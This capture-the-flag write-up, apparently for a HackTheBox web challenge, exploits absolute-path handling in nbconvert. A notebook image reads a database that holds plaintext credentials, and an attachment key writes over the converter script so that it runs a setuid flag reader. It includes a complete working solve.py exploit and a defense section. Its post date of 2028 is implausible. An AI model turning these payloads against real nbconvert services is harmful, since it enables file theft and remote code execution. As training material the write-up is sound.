---
layout: post
title: "Notebook Converter Pro"
date: 2028-01-29 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, nbconvert, jupyter, path-traversal, lfi, rce]
---

## Overview

Notebook Converter Pro is a Medium Web challenge — a Flask app that converts an
uploaded Jupyter notebook (`.ipynb`) to HTML or Markdown using **nbconvert 7.17.0**.
The flag lives in `/root/flag.txt` (mode `600`, owned by root) and is only readable
through a setuid-root `/readflag` helper, so a file-read alone can't reach it — you
need real code execution. The whole chain rests on one weakness in two shapes:
nbconvert trusts notebook-controlled paths in two `os.path.join()` sinks, and an
absolute path silently discards the safe base directory.

## The technique

In Python, `os.path.join("/safe/base", "/etc/passwd") == "/etc/passwd"` — an
**absolute** second argument wins and the base is thrown away. No `../` is ever
needed, so any traversal filter that only blocks `../` is bypassed. nbconvert
exposes this in two places:

- **A [path-traversal read](https://cwe.mitre.org/data/definitions/22.html) (LFI).**
  `HTMLExporter(embed_images=True)` inlines every markdown image via
  `IPythonRenderer._src_to_base64`, which does `os.path.join(self.path, src)` then
  reads and base64-embeds the file. A cell `![x](/srv/app/data/app.db)` embeds the
  app's SQLite DB into the output HTML. (Use a **bare** absolute path — a `file://`
  src is left as a plain `<img>` and never embedded.)
- **A path-traversal write.** In Markdown `saved_assets` mode, `FilesWriter` writes
  cell attachments to disk, and `ExtractAttachmentsPreprocessor` does
  `os.path.join(output_files_dir, key)` where the attachment **key** is
  attacker-controlled. An absolute key writes our bytes anywhere the worker can.

Because the app re-executes the converter as a **fresh subprocess per job**
(`python convert_job.py …`), overwriting that writable, app-owned script turns the
arbitrary write straight into [remote code execution](https://cwe.mitre.org/data/definitions/94.html).

## Solution

The full chain:

1. **LFI** — convert a notebook whose markdown image is an absolute path to the
   SQLite DB; decode the embedded blob and read the admin's plaintext password.
   (The `admin` password is random per boot — `secrets.token_urlsafe(14)` — and
   otherwise only logged, so this leak is the only way in.)
2. **Become admin** — log in with the leaked creds and flip the global toggle
   `POST /admin asset_storage_enabled=on`, which switches Markdown export to
   `saved_assets` (the `FilesWriter` write primitive).
3. **Arbitrary write** — convert a Markdown notebook whose attachment key is the
   absolute path `/srv/app/app/converter/convert_job.py`, overwriting the converter
   script with our own Python.
4. **RCE** — trigger any conversion; the next subprocess runs our script, which
   executes the setuid `/readflag` and writes the result into the job output, which
   we then download.

`solve.py` (the durable artifact) drives the whole chain:

```python
#!/usr/bin/env python3
import base64, json, re, sqlite3, sys, time
import requests

BASE = "http://" + sys.argv[1]
s = requests.Session()

def convert(nb, fmt):
    files = {"notebook": ("n.ipynb", json.dumps(nb).encode(), "application/json")}
    r = s.post(BASE + "/convert", data={"format": fmt}, files=files, allow_redirects=False)
    return r.headers.get("location", "").rstrip("/").split("/")[-1]

def download(job):
    return s.get(BASE + f"/jobs/{job}/download").content

def nb(cell):
    return {"cells": [cell], "metadata": {}, "nbformat": 4, "nbformat_minor": 5}

def login(u, p):
    s.post(BASE + "/register", data={"username": u, "password": p, "confirm_password": p})
    s.post(BASE + "/", data={"username": u, "password": p})

# 1) LFI: absolute markdown-image path -> app.db base64-embedded in the HTML
login("pwner", "pwnerpass123")
cell = {"cell_type": "markdown", "metadata": {}, "source": "![db](/srv/app/data/app.db)"}
html = download(convert(nb(cell), "html")).decode("utf-8", "replace")
admin_pw = None
for b in re.findall(r'data:[^;]*;base64,([A-Za-z0-9+/=]+)', html):
    raw = base64.b64decode(b + "===")
    if raw[:15] == b"SQLite format 3":
        open("/tmp/app.db", "wb").write(raw)
        for u, p, role in sqlite3.connect("/tmp/app.db").execute(
                "SELECT username,password,role FROM users"):
            if role == "admin":
                admin_pw = p

# 2) log in as admin, enable saved_assets (the write primitive)
login("admin", admin_pw)
s.post(BASE + "/admin", data={"asset_storage_enabled": "on"}, allow_redirects=False)

# 3) arbitrary write: attachment KEY is an absolute path -> overwrite the converter
EVIL = (
    'import sys, os, json, subprocess\n'
    'd = sys.argv[sys.argv.index("--output-dir") + 1]\n'
    'os.makedirs(d, exist_ok=True); out = os.path.join(d, "result.md")\n'
    'r = subprocess.run(["/readflag"], capture_output=True, text=True, timeout=10)\n'
    'open(out, "w").write((r.stdout or "") + (r.stderr or ""))\n'
    'print(json.dumps({"status": "ok", "output_path": out}))\n'
)
key = "/srv/app/app/converter/convert_job.py"
cell = {"cell_type": "markdown", "metadata": {},
        "source": f"![x](attachment:{key})",
        "attachments": {key: {"text/plain": base64.b64encode(EVIL.encode()).decode()}}}
convert(nb(cell), "markdown")

# 4) trigger: any new conversion now runs our converter -> /readflag -> flag
out = download(convert(nb({"cell_type": "markdown", "metadata": {}, "source": "go"}), "html"))
print(re.search(r'HTB\{[^}]+\}', out.decode("utf-8", "replace")).group(0))
```

Run it:

```bash
python3 solve.py <ip>:<port>
# -> HTB{...}
```

## Why it worked

nbconvert treats notebook JSON as trusted for *filesystem paths*. Two sinks —
`_src_to_base64` (read) and `ExtractAttachmentsPreprocessor` (write) — join a
trusted directory with a notebook-controlled string, and an absolute string erases
the directory. The read turns `embed_images` into a file-read oracle that leaked the
credential DB; the write, combined with an app that re-executes a writable converter
script every job, becomes code execution. The setuid `/readflag` split is by design:
the file-read only reaches app-user files, so the flag forces the full RCE finish.

## Fix / defense

- Never `os.path.join` a base directory with untrusted input and stop there —
  resolve and confirm containment, and reject absolute paths:
  `p = (base / user.lstrip("/")).resolve(); p.relative_to(base.resolve())`.
- Disable `embed_images` (or restrict it to `attachment:` URIs / an allowlisted
  directory) and don't extract attachments to disk (`FilesWriter`) for untrusted
  notebooks.
- Run the converter in a throwaway sandbox directory it can only write to — never
  inside the app's own source tree — as an unprivileged user.
- Store password hashes, not plaintext, and remove setuid `readflag`-style helpers
  so a future bug can't pivot to the root secret.
